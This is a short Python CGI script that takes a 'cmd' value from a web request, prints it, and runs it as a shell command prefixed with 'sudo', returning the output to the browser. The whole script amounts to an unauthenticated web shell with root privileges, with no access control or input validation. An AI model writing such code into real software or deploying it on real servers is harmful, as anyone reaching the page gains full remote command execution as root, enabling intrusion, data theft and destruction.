
#!/usr/bin/python3
import cgi

from subprocess import getoutput
print("content-type:text/html")
print("")

form = cgi.FieldStorage()


cmd = form.getvalue("cmd")

print(cmd)


print(getoutput("sudo "+cmd))

